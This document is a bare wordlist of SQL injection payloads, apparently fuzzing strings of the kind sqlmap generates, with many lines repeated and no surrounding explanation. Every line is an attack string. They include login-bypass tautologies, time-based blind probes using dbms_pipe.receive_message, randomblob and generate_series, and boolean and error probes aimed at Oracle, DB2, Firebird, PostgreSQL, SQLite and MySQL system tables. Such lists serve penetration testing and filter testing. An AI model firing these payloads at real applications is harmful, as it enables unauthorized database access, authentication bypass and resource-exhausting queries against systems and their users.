+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+admin' or '1'  =  '1'/*
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+admin"  )   or   (  "1"  =  "1"--
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+-8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+or 'unusual'   =   'unusual'
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1%"   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   as jidc where 6093  =  6093 and 9198  =  9198--
+1"  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+-1617%" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and "%"  =  "
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'   )    )    and 2832  =  4165--
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
